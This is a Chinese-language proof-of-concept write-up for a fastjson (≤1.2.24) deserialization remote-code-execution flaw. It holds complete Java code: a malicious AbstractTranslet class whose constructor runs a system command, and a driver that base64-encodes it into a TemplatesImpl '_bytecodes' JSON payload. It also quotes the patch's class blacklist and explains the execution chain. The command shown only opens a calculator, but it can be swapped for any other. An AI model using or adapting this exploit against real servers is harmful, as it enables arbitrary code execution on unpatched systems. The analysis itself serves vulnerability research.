fastjson remote code execute poc 
影响范围：fastjson <= 1.2.24

使用方法及说明：
直接用intellij IDEA打开即可
首先编译得到Test.class，然后运行Poc.java

支持jdk1.7，1.8
该poc只能运行在fastjson-1.2.22到fastjson-1.2.24版本区间，因为fastjson从1.2.22版本才开始引入SupportNonPublicField

分析：
1、逆向官方更新补丁
更新补丁主要的更新在checkAutoType函数，这个函数的主要功能就是添加了黑名单，将一些常用的反序列化利用库都添加到黑名单中。核心部分就是denyList的处理过程，遍历denyList，如果引入的库以denyList中某个deny打头，就会抛出异常，中断运行。
黑名单如下：
bsh,com.mchange,com.sun.,java.lang.Thread,java.net.Socket,java.rmi,javax.xml,org.apache.bcel,org.apache.commons.beanutils,
org.apache.commons.collections.Transformer,org.apache.commons.collections.functors,org.apache.commons.collections4.
comparators,org.apache.commons.fileupload,org.apache.myfaces.context.servlet,org.apache.tomcat,org.apache.wicket.util,
org.codehaus.groovy.runtime,org.hibernate,org.jboss,org.mozilla.javascript,org.python.core,org.springframework

TemplatesImpl类有一个字段就是_bytecodes，有部分函数会根据这个_bytecodes生成java实例，简直不能再更妙，这就解决了fastjson通过字段传入一个类，再通过这个类执行有害代码。后来阅读ysoserial的代码时也发现在gadgets.java这个文件中也使用到了这个类来动态生成可执行命令的代码。
test代码：
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
 
import java.io.IOException;
 
public class Test extends AbstractTranslet {
    public Test() throws IOException {
        Runtime.getRuntime().exec("calc");
    }
 
    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
    }
 
    @Override
    public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException {
 
    }
 
    public static void main(String[] args) throws Exception {
        Test t = new Test();
    }
}
，在Test.java的构造函数中执行了一条命令，弹出计算器。编译Test.java得到Test.class供后续使用。后续会将Test.class的内容赋值给_bytecodes。
package person;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import org.apache.commons.io.IOUtils;
import org.apache.commons.codec.binary.Base64;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;

/**
 * Created by web on 2017/4/29.
 */
public class P{

    public static String readClass(String cls){
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try {
            IOUtils.copy(new FileInputStream(new File(cls)), bos);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return Base64.encodeBase64String(bos.toByteArray());

    }

    public static void  test_autoTypeDeny() throws Exception {
        ParserConfig config = new ParserConfig();
        final String fileSeparator = System.getProperty("file.separator");
        final String evilClassPath = System.getProperty("user.dir") + "\\target\\classes\\person\\Test.class";
        String evilCode = readClass(evilClassPath);
        final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
        String text1 = "{\"@type\":\"" + NASTY_CLASS +
                "\",\"_bytecodes\":[\""+evilCode+"\"],'_name':'a.b',\"_outputProperties\":{ }," +
                "\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}\n";
        System.out.println(text1);
       
        Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);
        //assertEquals(Model.class, obj.getClass());
    }
    public static void main(String args[]){
        try {
            test_autoTypeDeny();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
在这个程序验证代码中，最核心的部分是_bytecodes，它是要执行的代码，@type是指定的解析类，fastjson会根据指定类去反序列化得到该类的实例，在默认情况下，fastjson只会反序列化公开的属性和域，而com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl中_bytecodes却是私有属性，_name也是私有域，所以在parseObject的时候需要设置Feature.SupportNonPublicField，这样_bytecodes字段才会被反序列化。_tfactory这个字段在TemplatesImpl既没有get方法也没有set方法，所以是设置不了的，弹计算器的图中展示了但是实际运行却没有使用，只能依赖于jdk的实现，作者在1.8.0_25,1.7.0_05测试都能弹出计算器，某些版本中在defineTransletClasses()用到会引用_tfactory属性导致异常退出。
在getTransletInstance调用defineTransletClasses，在defineTransletClasses方法中会根据_bytecodes来生成一个java类，生成的java类随后会被getTransletInstance方法用到生成一个实例，也也就到了最终的执行命令的位置Runtime.getRuntime.exec()

